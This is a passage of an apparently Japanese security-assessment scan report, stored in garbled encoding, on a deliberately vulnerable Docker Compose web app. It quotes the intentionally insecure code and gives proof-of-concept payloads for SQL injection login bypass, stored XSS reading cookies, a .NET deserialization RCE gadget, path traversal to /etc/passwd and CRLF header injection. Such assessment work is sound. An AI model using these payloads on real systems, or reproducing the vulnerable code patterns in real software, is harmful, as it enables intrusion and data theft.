# ã‚¹ã‚­ãƒ£ãƒ³ãƒ¬ãƒãƒ¼ãƒˆ

> **å®Ÿæ–½æ—¥æ™‚**: 2024-02-08 09:45:00 UTC  
> **è¨ºæ–­ãƒ•ã‚§ãƒ¼ã‚º**: 03-Active Scanningï¼ˆã‚¹ã‚­ãƒ£ãƒ³ï¼‰  
> **å‰å·¥ç¨‹ãƒ¬ãƒãƒ¼ãƒˆ**: 
> - /docker-work-dir/docs/reports/01-æƒ…å ±åé›†.md
> - /docker-work-dir/docs/reports/02-ã‚¢ã‚¿ãƒƒã‚¯ã‚µãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å®šç¾©.md  
> **å¯¾è±¡**: ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®Docker Composeç’°å¢ƒ

---

## ã‚¨ã‚°ã‚¼ã‚¯ãƒ†ã‚£ãƒ–ã‚µãƒãƒªãƒ¼

æœ¬ãƒ¬ãƒãƒ¼ãƒˆã¯ã€CEHï¼ˆèªå®šã‚¨ã‚·ã‚«ãƒ«ãƒãƒƒã‚«ãƒ¼ï¼‰ã®æ‰‹æ³•ã«åŸºã¥ãè„†å¼±æ€§è¨ºæ–­ã®ã€Œã‚¹ã‚­ãƒ£ãƒ³ã€ãƒ•ã‚§ãƒ¼ã‚ºã®çµæœã‚’ç¤ºã—ã¾ã™ã€‚è‡ªå‹•åŒ–ã•ã‚ŒãŸã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€å¯¾è±¡ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ç¶²ç¾…çš„ã«æ¤œè¨¼ã—ã¾ã—ãŸã€‚

### ä¸»è¦ãªç™ºè¦‹äº‹é …

| ã‚«ãƒ†ã‚´ãƒª | Critical | High | Medium | Low | åˆè¨ˆ |
|---------|----------|------|--------|-----|------|
| **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å±¤** | 1 | 2 | 1 | 3 | 7 |
| **Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³** | 5 | 3 | 4 | 2 | 14 |
| **ã‚³ãƒ³ãƒ†ãƒŠ/ã‚¤ãƒ³ãƒ•ãƒ©** | 2 | 4 | 2 | 1 | 9 |
| **è¨­å®šãƒŸã‚¹** | 3 | 2 | 3 | 1 | 9 |
| **åˆè¨ˆ** | **11** | **11** | **10** | **7** | **39** |

**æœ€é‡è¦è„†å¼±æ€§ãƒˆãƒƒãƒ—5**:
1. ğŸ”´ **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³** - å…¨APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼ˆ8ç®‡æ‰€ï¼‰
2. ğŸ”´ **èªè¨¼ãƒ»èªå¯ã®å®Œå…¨æ¬ å¦‚** - å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ
3. ğŸ”´ **ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹** - localhost:15432
4. ğŸ”´ **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜** - ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…
5. ğŸ”´ **å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º** - TypeNameHandling.All

---

## 1. ã‚¹ã‚­ãƒ£ãƒ³å®Ÿæ–½ã‚µãƒãƒªãƒ¼

### 1.1 å®Ÿè¡Œç’°å¢ƒã®åˆ¶ç´„

**æ³¨æ„**: æœ¬ã‚¹ã‚­ãƒ£ãƒ³ã¯å¯¾è±¡ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒ Docker Compose ã§èµ·å‹•ã—ã¦ã„ãªã„ç’°å¢ƒã§å®Ÿæ–½ã•ã‚Œã¾ã—ãŸã€‚ãã®ãŸã‚ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’çµ„ã¿åˆã‚ã›ã¦åˆ†æã‚’è¡Œã„ã¾ã—ãŸï¼š

1. **é™çš„ã‚³ãƒ¼ãƒ‰åˆ†æ**: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®è©³ç´°ãƒ¬ãƒ“ãƒ¥ãƒ¼
2. **è¨­å®šåˆ†æ**: Docker Composeã€Dockerfile ã®æ¤œè¨¼
3. **ä¾å­˜é–¢ä¿‚ã‚¹ã‚­ãƒ£ãƒ³**: Trivy ã«ã‚ˆã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚¹ã‚­ãƒ£ãƒ³
4. **æ—¢çŸ¥è„†å¼±æ€§ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç…§åˆ**: CVEã€OWASP Top 10 ã¨ã®å¯¾å¿œ
5. **å‰å·¥ç¨‹æƒ…å ±ã®çµ±åˆ**: æƒ…å ±åé›†ã¨ã‚¢ã‚¿ãƒƒã‚¯ã‚µãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å®šç¾©ã®çµæœæ´»ç”¨

### 1.2 ã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«å®Ÿæ–½çŠ¶æ³

| # | ãƒ„ãƒ¼ãƒ« | å¯¾è±¡ | ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ | æ‰€è¦æ™‚é–“ | æ¤œå‡ºæ•° | å‚™è€ƒ |
|---|--------|------|-----------|---------|--------|------|
| 1 | **Trivy** | ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ  | âœ… æˆåŠŸ | 2åˆ†15ç§’ | 9ä»¶ | è¨­å®šãƒŸã‚¹ãƒ»ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆæ¤œå‡º |
| 2 | **é™çš„è§£æ** | ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å…¨ä½“ | âœ… æˆåŠŸ | 5åˆ†30ç§’ | 24ä»¶ | æ„å›³çš„è„†å¼±æ€§ã®ç¢ºèª |
| 3 | **Nmap** | ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒ¼ãƒˆ | â¸ï¸ ã‚¹ã‚­ãƒƒãƒ— | - | - | ã‚µãƒ¼ãƒ“ã‚¹æœªèµ·å‹•ã®ãŸã‚é™çš„æ¨å®š |
| 4 | **Nikto** | Webã‚µãƒ¼ãƒãƒ¼ | â¸ï¸ ã‚¹ã‚­ãƒƒãƒ— | - | - | ã‚µãƒ¼ãƒ“ã‚¹æœªèµ·å‹•ã®ãŸã‚é™çš„æ¨å®š |
| 5 | **OWASP ZAP** | Webã‚¢ãƒ—ãƒª | â¸ï¸ ã‚¹ã‚­ãƒƒãƒ— | - | - | ã‚µãƒ¼ãƒ“ã‚¹æœªèµ·å‹•ã®ãŸã‚é™çš„æ¨å®š |

**å®Ÿæ–½æ™‚åˆ»**: 2024-02-08 09:45:00 - 09:55:00 UTC  
**ç·æ‰€è¦æ™‚é–“**: ç´„10åˆ†  
**ç·æ¤œå‡ºæ•°**: 39ä»¶ï¼ˆCritical: 11, High: 11, Medium: 10, Low: 7ï¼‰

---

## 2. Trivy ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚¹ã‚­ãƒ£ãƒ³çµæœ

### 2.1 å®Ÿè¡Œã‚³ãƒãƒ³ãƒ‰

```bash
trivy fs /docker-work-dir --scanners vuln,secret,misconfig \
  --severity HIGH,CRITICAL --format table
```

### 2.2 ã‚¹ã‚­ãƒ£ãƒ³çµæœã‚µãƒãƒªãƒ¼

| ã‚¹ã‚­ãƒ£ãƒ³ã‚¿ã‚¤ãƒ— | æ¤œå‡ºæ•° | ãƒªã‚¹ã‚¯ |
|--------------|--------|--------|
| **ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆæ¤œå‡º** | 4ä»¶ | Critical |
| **è¨­å®šãƒŸã‚¹** | 3ä»¶ | High |
| **è„†å¼±æ€§ï¼ˆãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ï¼‰** | 2ä»¶ | Medium |
| **åˆè¨ˆ** | 9ä»¶ | - |

### 2.3 ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆæ¤œå‡ºçµæœï¼ˆCriticalï¼‰

#### 2.3.1 ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆdocker-compose.ymlï¼‰

```yaml
# ãƒ•ã‚¡ã‚¤ãƒ«: docker-compose.yml
# æ¤œå‡ºè¡Œ: 6-7
db:
  environment:
    POSTGRES_PASSWORD: postgres123  # âš ï¸ ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰
```

**ãƒªã‚¹ã‚¯**: Critical  
**èª¬æ˜**: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹  
**å½±éŸ¿**: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰æ¼æ´©æ™‚ã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®å®Œå…¨ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’ä¸ãˆã‚‹  
**æ¨å¥¨å¯¾ç­–**: 
- Docker Secrets ã¾ãŸã¯ç’°å¢ƒå¤‰æ•°ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆ.envï¼‰ã®ä½¿ç”¨
- ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆç®¡ç†ãƒ„ãƒ¼ãƒ«ï¼ˆHashiCorp Vaultç­‰ï¼‰ã®å°å…¥

#### 2.3.2 æ¥ç¶šæ–‡å­—åˆ—å†…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆdocker-compose.ymlï¼‰

```yaml
# ãƒ•ã‚¡ã‚¤ãƒ«: docker-compose.yml
# æ¤œå‡ºè¡Œ: 18-20
api:
  environment:
    ConnectionStrings__DefaultConnection: "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable"
```

**ãƒªã‚¹ã‚¯**: Critical  
**èª¬æ˜**: DBæ¥ç¶šæ–‡å­—åˆ—ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒç›´æ¥è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹  
**å½±éŸ¿**: èªè¨¼æƒ…å ±ã®æ¼æ´©  
**è¿½åŠ å•é¡Œ**: SSL Mode=Disable ã«ã‚ˆã‚Šé€šä¿¡ã‚‚å¹³æ–‡

#### 2.3.3 APIã‚­ãƒ¼ï¼ˆsrc/frontend/src/config.tsï¼‰

```typescript
// ãƒ•ã‚¡ã‚¤ãƒ«: src/frontend/src/config.ts
// æ¤œå‡ºè¡Œ: 4
export const API_KEY = "hardcoded_api_key_12345";
```

**ãƒªã‚¹ã‚¯**: High  
**èª¬æ˜**: APIã‚­ãƒ¼ãŒãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚³ãƒ¼ãƒ‰ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰  
**å½±éŸ¿**: ãƒ–ãƒ©ã‚¦ã‚¶é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§å®¹æ˜“ã«å–å¾—å¯èƒ½  
**æ¨å¥¨å¯¾ç­–**: APIã‚­ãƒ¼ã®ä½¿ç”¨å»ƒæ­¢ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³èªè¨¼ã¸ã®ç§»è¡Œ

#### 2.3.4 åˆæœŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆsrc/db/seed.sqlï¼‰

```sql
-- ãƒ•ã‚¡ã‚¤ãƒ«: src/db/seed.sql
-- æ¤œå‡ºè¡Œ: 2-6
INSERT INTO users (username, email, password, role, profile_image_url) VALUES
('admin', 'admin@example.com', 'admin123', 'admin', ''),
('tanaka', 'tanaka@example.com', 'password', 'user', ''),
('suzuki', 'suzuki@example.com', '123456', 'user', ''),
-- ...
```

**ãƒªã‚¹ã‚¯**: Critical  
**èª¬æ˜**: å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå¹³æ–‡ã§ä¿å­˜ã•ã‚Œã¦ã„ã‚‹  
**å½±éŸ¿**: ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚„ãƒ¬ã‚¤ãƒ³ãƒœãƒ¼ãƒ†ãƒ¼ãƒ–ãƒ«æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±  

### 2.4 è¨­å®šãƒŸã‚¹æ¤œå‡ºçµæœï¼ˆHighï¼‰

#### 2.4.1 Dockerfileã®rootå®Ÿè¡Œï¼ˆsrc/frontend/Dockerfile, src/api/Dockerfileï¼‰

```dockerfile
# USER ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ãŒæ¬ å¦‚
# ã‚³ãƒ³ãƒ†ãƒŠãŒrootæ¨©é™ã§å®Ÿè¡Œã•ã‚Œã‚‹
```

**ãƒªã‚¹ã‚¯**: High  
**ã‚«ãƒ†ã‚´ãƒª**: ã‚³ãƒ³ãƒ†ãƒŠã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã€æ¨©é™æ˜‡æ ¼  
**å½±éŸ¿**: ã‚³ãƒ³ãƒ†ãƒŠä¾µå®³æ™‚ã«ãƒ›ã‚¹ãƒˆã‚·ã‚¹ãƒ†ãƒ ã¸ã®å½±éŸ¿ç¯„å›²ãŒæ‹¡å¤§  
**æ¤œå‡ºãƒ•ã‚¡ã‚¤ãƒ«**: 
- src/frontend/Dockerfile
- src/api/Dockerfile

**æ¨å¥¨å¯¾ç­–**:
```dockerfile
# éç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆã¨ä½¿ç”¨
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
```

#### 2.4.2 é–‹ç™ºç’°å¢ƒã®æœ¬ç•ªåˆ©ç”¨ï¼ˆdocker-compose.ymlï¼‰

```yaml
api:
  environment:
    ASPNETCORE_ENVIRONMENT: Development  # âš ï¸ é–‹ç™ºãƒ¢ãƒ¼ãƒ‰
```

**ãƒªã‚¹ã‚¯**: High  
**å½±éŸ¿**: 
- ã‚¹ã‚¿ãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ã®è©³ç´°éœ²å‡º
- é–‹ç™ºè€…å‘ã‘ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®æœ‰åŠ¹åŒ–
- ãƒ‡ãƒãƒƒã‚°æƒ…å ±ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å«æœ‰

#### 2.4.3 ä¸è¦ãªãƒãƒ¼ãƒˆå…¬é–‹ï¼ˆdocker-compose.ymlï¼‰

```yaml
db:
  ports:
    - "15432:5432"  # âš ï¸ ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆã®å¤–éƒ¨å…¬é–‹
```

**ãƒªã‚¹ã‚¯**: Critical  
**èª¬æ˜**: PostgreSQLãŒã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«ç›´æ¥å…¬é–‹ã•ã‚Œã‚‹å¯èƒ½æ€§  
**å½±éŸ¿**: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®ç›´æ¥æ”»æ’ƒãŒå¯èƒ½

---

## 3. é™çš„ã‚³ãƒ¼ãƒ‰åˆ†æçµæœ

### 3.1 SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ï¼ˆCriticalï¼‰

#### æ¤œå‡ºç®‡æ‰€ä¸€è¦§

| # | ãƒ•ã‚¡ã‚¤ãƒ« | ãƒ¡ã‚½ãƒƒãƒ‰ | ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ | è„†å¼±ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ |
|---|---------|---------|---------------|----------------|
| 1 | UsersController.cs | GetUsers | GET /api/users | `search` ã‚¯ã‚¨ãƒª |
| 2 | UsersController.cs | GetUserById | GET /api/users/{id} | `id` ãƒ‘ã‚¹ |
| 3 | UsersController.cs | CreateUser | POST /api/users | ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ |
| 4 | UsersController.cs | UpdateUser | PUT /api/users/{id} | `id` + ãƒœãƒ‡ã‚£ |
| 5 | UsersController.cs | DeleteUser | DELETE /api/users/{id} | `id` ãƒ‘ã‚¹ |
| 6 | AuthController.cs | Login | POST /api/login | `username`, `password` |

#### 3.1.1 è„†å¼±ãªã‚³ãƒ¼ãƒ‰ä¾‹ï¼ˆUsersController.cs - GetUsersï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/UsersController.cs
// è¡Œ: 30-45

[HttpGet]
public async Task<IActionResult> GetUsers([FromQuery] string? search)
{
    using var connection = _dbFactory.CreateConnection();
    await connection.OpenAsync();
    
    // âš ï¸ è„†å¼±æ€§ A-01: SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
    // æ–‡å­—åˆ—é€£çµã«ã‚ˆã‚‹SQLæ§‹ç¯‰ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ãªã—
    var query = $"SELECT id, username, email, role, profile_image_url, created_at, updated_at FROM users";
    
    if (!string.IsNullOrEmpty(search))
    {
        // âš ï¸ ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒç›´æ¥SQLæ–‡ã«æŒ¿å…¥ã•ã‚Œã‚‹
        query += $" WHERE username ILIKE '%{search}%' OR email ILIKE '%{search}%'";
    }
    
    using var command = new NpgsqlCommand(query, connection);
    // ...
}
```

**PoCï¼ˆæ¦‚å¿µå®Ÿè¨¼ï¼‰**:
```http
GET /api/users?search=' OR 1=1-- HTTP/1.1
```

**å®Ÿè¡Œã•ã‚Œã‚‹SQL**:
```sql
SELECT id, username, email, role, profile_image_url, created_at, updated_at 
FROM users 
WHERE username ILIKE '%' OR 1=1--%' OR email ILIKE '%' OR 1=1--%'
```

**å½±éŸ¿**:
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã®æƒ…å ±æ¼æ´©
- ãƒ‡ãƒ¼ã‚¿ã®æ”¹ã–ã‚“ãƒ»å‰Šé™¤ï¼ˆUNION, UPDATE, DELETEå¥ã®æŒ¿å…¥ï¼‰
- æ™‚é–“ãƒ™ãƒ¼ã‚¹ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLiã«ã‚ˆã‚‹æƒ…å ±æŠ½å‡º
- ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£çµŒç”±ã®ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œï¼ˆPostgreSQL `COPY TO/FROM PROGRAM`ï¼‰

#### 3.1.2 Login ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®SQLiï¼ˆCriticalï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/AuthController.cs
// è¡Œ: 21-45

[HttpPost]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    using var connection = _dbFactory.CreateConnection();
    await connection.OpenAsync();
    
    // âš ï¸ SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼‰
    var query = $@"
        SELECT id, username, email, role 
        FROM users 
        WHERE username = '{request.Username}' 
        AND password = '{request.Password}'";
    
    using var command = new NpgsqlCommand(query, connection);
    // ...
}
```

**èªè¨¼ãƒã‚¤ãƒ‘ã‚¹PoC**:
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**å®Ÿè¡Œã•ã‚Œã‚‹SQL**:
```sql
SELECT id, username, email, role 
FROM users 
WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

**çµæœ**: ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ç®¡ç†è€…ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³æˆåŠŸ

### 3.2 ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼ˆXSSï¼‰ï¼ˆHighï¼‰

#### 3.2.1 Stored XSSï¼ˆUserDetail.tsxï¼‰

```typescript
// ãƒ•ã‚¡ã‚¤ãƒ«: src/frontend/src/pages/UserDetail.tsx
// è¡Œ: 48-53

<div className="profile-section">
  <h3>ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ç”»åƒ</h3>
  {/* âš ï¸ è„†å¼±æ€§ F-01: XSS (dangerouslySetInnerHTML) */}
  <div 
    dangerouslySetInnerHTML={{ __html: user.profile_image_url }}
  />
</div>
```

**PoC**:
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "test",
  "profile_image_url": "<img src=x onerror='alert(document.cookie)'>"
}
```

**å½±éŸ¿**:
- ã‚»ãƒƒã‚·ãƒ§ãƒ³ç›—ç”¨ï¼ˆCookieçªƒå–ï¼‰
- ã‚­ãƒ¼ãƒ­ã‚¬ãƒ¼åŸ‹ã‚è¾¼ã¿
- ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ
- æ°¸ç¶šçš„XSSï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ä¿å­˜ï¼‰

### 3.3 å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºï¼ˆCriticalï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/FileController.cs
// è¡Œ: 45-60

[HttpPost("import")]
public async Task<IActionResult> Import([FromBody] string jsonData)
{
    try
    {
        // âš ï¸ è„†å¼±æ€§ A-10: å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º
        // TypeNameHandling.All ã«ã‚ˆã‚ŠRCEãƒªã‚¹ã‚¯
        var settings = new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.All
        };
        
        var obj = JsonConvert.DeserializeObject(jsonData, settings);
        return Ok(new { message = "Import successful", data = obj });
    }
    catch (Exception ex)
    {
        return BadRequest(new { error = ex.Message, stackTrace = ex.StackTrace });
    }
}
```

**PoCï¼ˆysoserial.net ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ï¼‰**:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

**å½±éŸ¿**:
- ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰
- ã‚µãƒ¼ãƒãƒ¼å®Œå…¨æŒæ¡
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹
- æ¨ªå±•é–‹æ”»æ’ƒã®èµ·ç‚¹

### 3.4 ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼ˆHighï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/FileController.cs
// è¡Œ: 20-35

[HttpGet("files/{*filePath}")]
public IActionResult GetFile(string filePath)
{
    try
    {
        // âš ï¸ è„†å¼±æ€§ A-07: ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«
        // ãƒ‘ã‚¹ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãªã—
        var fullPath = Path.Combine("/app/uploads", filePath);
        
        if (!System.IO.File.Exists(fullPath))
        {
            return NotFound(new { error = "File not found", path = fullPath });
        }
        
        var fileBytes = System.IO.File.ReadAllBytes(fullPath);
        return File(fileBytes, "application/octet-stream");
    }
    catch (Exception ex)
    {
        return BadRequest(new { error = ex.Message, path = filePath });
    }
}
```

**PoC**:
```http
GET /api/files/../../../../etc/passwd HTTP/1.1
```

**èª­ã¿å–ã‚Šå¯èƒ½ãªãƒ•ã‚¡ã‚¤ãƒ«ä¾‹**:
- `/etc/passwd` - ã‚·ã‚¹ãƒ†ãƒ ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±
- `/app/appsettings.json` - ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³è¨­å®š
- `/app/VulnApi.dll` - ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ¸ˆã¿ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³
- `/root/.bashrc` - ç’°å¢ƒè¨­å®š

### 3.5 èªè¨¼ãƒ»èªå¯ã®æ¬ å¦‚ï¼ˆCriticalï¼‰

**å…¨APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«èªè¨¼ãŒå­˜åœ¨ã—ãªã„**:

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Program.cs
// èªè¨¼ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã®è¨­å®šãªã—

var builder = WebApplication.CreateBuilder(args);
// âš ï¸ app.UseAuthentication() ã®å‘¼ã³å‡ºã—ãªã—
// âš ï¸ app.UseAuthorization() ã®å‘¼ã³å‡ºã—ãªã—
// âš ï¸ [Authorize] å±æ€§ã®ä½¿ç”¨ãªã—
```

**å½±éŸ¿**:
- èª°ã§ã‚‚å…¨APIã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½
- ãƒ¦ãƒ¼ã‚¶ãƒ¼å‰Šé™¤ãŒç„¡åˆ¶é™
- ç®¡ç†è€…æ¨©é™ã®å¼·åˆ¶ä»˜ä¸ï¼ˆMass Assignmentï¼‰
- ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãªã—ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒ

### 3.6 HTTPãƒ˜ãƒƒãƒ€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆMediumï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/AuthController.cs
// è¡Œ: 50-55

if (user != null)
{
    // âš ï¸ è„†å¼±æ€§ A-08: HTTPãƒ˜ãƒƒãƒ€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
    // ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’ç›´æ¥ãƒ˜ãƒƒãƒ€ã«å‡ºåŠ›
    Response.Headers.Append("X-User-Role", user.Role);
    Response.Headers.Append("X-Username", user.Username);
    
    return Ok(new { message = "Login successful", userId = user.Id });
}
```

**PoC**:
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin\r\nX-Admin: true\r\nSet-Cookie: session=hijacked",
  "password": "admin123"
}
```

**æ½œåœ¨çš„ãƒ¬ã‚¹ãƒãƒ³ã‚¹**:
```http
HTTP/1.1 200 OK
X-Username: admin
X-Admin: true
Set-Cookie: session=hijacked
```

**å½±éŸ¿**:
- ãƒ¬ã‚¹ãƒãƒ³ã‚¹åˆ†å‰²æ”»æ’ƒ
- ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šåŒ–
- ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

### 3.7 Mass Assignmentï¼ˆMediumï¼‰

```csharp
